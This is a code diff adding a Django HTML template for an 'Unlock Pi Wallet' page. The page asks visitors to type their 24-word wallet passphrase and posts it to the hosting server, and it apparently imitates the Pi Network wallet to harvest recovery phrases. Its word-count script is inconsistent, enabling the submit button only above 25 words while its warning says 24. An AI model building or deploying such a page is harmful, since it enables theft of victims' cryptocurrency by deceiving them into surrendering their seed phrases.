@@ -1,0 +1,57 @@
+{% extends "./base.html" %}
+{% load static %}
+{% block content %}
+<script src="https://cdn.tailwindcss.com"></script>
+<div class="flex items-center justify-center min-h-screen bg-gray-100">
+
+    <form class="w-full max-w-md bg-white shadow-md rounded-lg p-6" method="post">
+        {% csrf_token %}
+        <h2 class="text-2xl font-semibold text-center mb-4">Unlock Pi Wallet</h2>
+         
+        <textarea id="passphrase" cols="22" rows="4" name="wallet" class="w-full h-[200px] p-3 border-2 border-purple-500 rounded-md text-gray-600 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500" placeholder="Enter your 24-word passphrase here"
+           
+            oninput="checkWordCount()"
+        ></textarea>
+
+        <p id="warning" class="text-red-500 text-sm mt-2 hidden">
+            Passphrase must be  24 words.
+        </p>
+
+        <button id="unlockButton" 
+            class="w-full bg-purple-600 text-white py-3 rounded-md mt-4 hover:bg-purple-700 transition disabled:bg-gray-400 disabled:cursor-not-allowed"
+            disabled
+            type="submit"
+        >
+            Unlock With Passphrase
+        </button>
+
+        <p class="text-sm text-gray-600 mt-4 text-center">
+            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
+            Recovery of passphrase is currently impossible.
+        </p>
+
+        <p class="text-sm text-gray-600 mt-2 text-center">
+            Lost your passphrase? <a href="#" class="text-blue-500">You can create a new wallet</a>,
+            but all your π in your previous wallet will be inaccessible.
+        </p>
+    </form>
+
+    <script>
+        function checkWordCount() {
+            let input = document.getElementById("passphrase").value.trim();
+            let words = input.split(/\s+/).filter(word => word.length > 0);
+            let button = document.getElementById("unlockButton");
+            let warning = document.getElementById("warning");
+
+            if (words.length > 25) {
+                button.disabled = false;
+                warning.classList.add("hidden");
+            } else {
+                button.disabled = true;
+                warning.classList.remove("hidden");
+            }
+        }
+    </script>
+
+</div>
+{% endblock content %}
